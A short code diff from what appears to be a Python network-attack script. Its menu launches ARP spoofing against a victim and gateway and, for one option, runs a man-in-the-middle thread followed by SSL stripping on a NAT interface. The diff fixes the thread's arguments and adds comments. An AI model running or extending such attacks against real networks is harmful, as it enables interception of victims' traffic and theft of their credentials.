@@ -76,8 +76,12 @@ def main():
         arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
     elif attack.lower() == "e":
         print("SSL Stripping...")
-        mitm = threading.Thread(target=arp_mitm_gateway.gateway_spoof, args=(ipVictimNAT, macVictimNAT, ipGateway, macAttackerNAT, interfaceNAT))
+        # Perform Man-in-the-Middle using a separate thread 
+        mitm = threading.Thread(\
+            target=arp_mitm_gateway.gateway_spoof, args=  \
+                (ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
         mitm.start()
+        # initiate SSL stripping attack on the NAT interface
         ssl_strip.ssl_strip(interfaceNAT)
 
     else:
